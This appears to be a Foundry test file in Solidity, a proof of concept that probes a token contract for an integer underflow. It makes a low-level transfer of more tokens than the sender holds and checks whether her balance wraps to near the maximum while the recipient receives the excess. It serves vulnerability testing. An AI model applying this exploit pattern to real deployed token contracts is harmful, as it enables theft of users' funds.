// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/token.sol";

contract TokenUnderflowTest is Test {
    Token token;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 initialSupply = 100;

    function setUp() public {
        token = new Token(initialSupply);
        // Transfer initial funds to Alice directly from the token deployer account
        token.transfer(alice, initialSupply);
    }

    function testTransferUnderflow() public {
        // Verify Alice's initial balance
        uint256 initialBalance = token.balanceOf(alice);
        assertEq(initialBalance, initialSupply, "Alice should have initial supply");

        console2.log("--- BEFORE Transfer Attempt ---");
        uint256 aliceBalanceBefore = token.balanceOf(alice);
        uint256 bobBalanceBefore = token.balanceOf(bob);
        uint256 totalSupplyBefore = token.totalSupply();
        
        console2.log("Alice balance: %d", aliceBalanceBefore);
        console2.log("Bob balance: %d", bobBalanceBefore);
        console2.log("Total supply: %d", totalSupplyBefore);
        
        console2.log("--- PERFORMING Overflow Transfer (%d tokens) ---", initialSupply + 10);
        // Attempt to transfer more tokens than Alice has using low-level call to prevent revert
        bytes memory payload = abi.encodeWithSelector(
            token.transfer.selector, 
            bob, 
            initialSupply + 10
        );
        
        vm.prank(alice);
        (bool success, ) = address(token).call(payload);
        console2.log("Transfer completed (did not revert): %s", success);

        console2.log("--- AFTER Transfer Attempt ---");
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 bobBalanceAfter = token.balanceOf(bob);
        uint256 totalSupplyAfter = token.totalSupply();
        
        console2.log("Alice balance: %d", aliceBalanceAfter);
        console2.log("Bob balance: %d", bobBalanceAfter);
        console2.log("Total supply: %d", totalSupplyAfter);

        // Vulnerability detection logic
        bool aliceUnderflowed = (aliceBalanceAfter == type(uint256).max - 9);
        bool bobReceivedExcess = (bobBalanceAfter == bobBalanceBefore + initialSupply + 10);
        bool totalSupplyChanged = (totalSupplyAfter != totalSupplyBefore);
        bool vulnerabilityExploited = aliceUnderflowed && bobReceivedExcess && !totalSupplyChanged;
        
        console2.log("Exploit Result:");
        console2.log("Alice underflowed: %s", aliceUnderflowed ? "YES" : "NO");
        console2.log("Bob received full amount: %s", bobReceivedExcess ? "YES" : "NO");
        console2.log("Total supply integrity broken: %s", totalSupplyChanged ? "YES" : "NO");
        
        // Final vulnerability verdict with state comparison
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Underflow occurred - Alice balance overflowed to max-9 while Bob received excess tokens");
        } else {
            console2.log("Vulnerability not Exist: Either no underflow occurred or state integrity maintained");
        }
    }
}